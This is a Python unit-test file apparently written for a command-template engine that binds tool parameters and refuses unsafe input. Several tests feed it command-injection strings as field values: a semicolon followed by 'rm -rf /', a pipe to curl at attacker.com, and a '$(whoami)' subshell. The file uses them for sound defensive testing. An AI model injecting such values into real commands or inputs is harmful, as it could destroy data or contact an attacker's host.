from __future__ import annotations

import unittest

from jhoc.contracts.errors import ContractError, ErrorCode
from jhoc.runner.parameterized import ParameterTemplate, ParameterizedInvocationEngine


class TestParameterizedInvocationEngine(unittest.TestCase):
    def setUp(self) -> None:
        self.git_log_template = ParameterTemplate(
            tool_id="git.log",
            command_skeleton=("git", "log", "-n"),
            param_keys=("count",),
            allowed_flags=frozenset({"--oneline", "--stat"}),
        )

    def test_bind_safe_parameters(self) -> None:
        args = ParameterizedInvocationEngine.compile_and_bind(
            self.git_log_template,
            {"count": "10"},
            active_flags=("--oneline",),
        )
        self.assertEqual(args, ("git", "log", "-n", "--oneline", "10"))

    def test_disallowed_flag_rejected(self) -> None:
        with self.assertRaises(ContractError) as ctx:
            ParameterizedInvocationEngine.compile_and_bind(
                self.git_log_template,
                {"count": "10"},
                active_flags=("--evil-flag",),
            )
        self.assertEqual(ctx.exception.code, ErrorCode.POLICY_DENIED)

    def test_command_injection_semicolon_rejected(self) -> None:
        with self.assertRaises(ContractError) as ctx:
            ParameterizedInvocationEngine.compile_and_bind(
                self.git_log_template,
                {"count": "5; rm -rf /"},
            )
        self.assertEqual(ctx.exception.code, ErrorCode.POLICY_DENIED)
        self.assertIn("dangerous shell operator", str(ctx.exception))

    def test_command_injection_pipe_rejected(self) -> None:
        with self.assertRaises(ContractError) as ctx:
            ParameterizedInvocationEngine.compile_and_bind(
                self.git_log_template,
                {"count": "5 | curl http://attacker.com"},
            )
        self.assertEqual(ctx.exception.code, ErrorCode.POLICY_DENIED)

    def test_command_injection_subshell_rejected(self) -> None:
        with self.assertRaises(ContractError) as ctx:
            ParameterizedInvocationEngine.compile_and_bind(
                self.git_log_template,
                {"count": "$(whoami)"},
            )
        self.assertEqual(ctx.exception.code, ErrorCode.POLICY_DENIED)

    def test_allow_shell_true_rejected_at_construction(self) -> None:
        with self.assertRaises(ContractError) as ctx:
            ParameterTemplate(
                tool_id="bad.shell",
                command_skeleton=("sh",),
                param_keys=(),
                allow_shell=True,
            )
        self.assertEqual(ctx.exception.code, ErrorCode.POLICY_DENIED)

    def test_missing_parameter_slot_rejected(self) -> None:
        with self.assertRaises(ContractError) as ctx:
            ParameterizedInvocationEngine.compile_and_bind(
                self.git_log_template,
                {},
            )
        self.assertEqual(ctx.exception.code, ErrorCode.INVALID_CONTRACT)


if __name__ == "__main__":
    unittest.main()
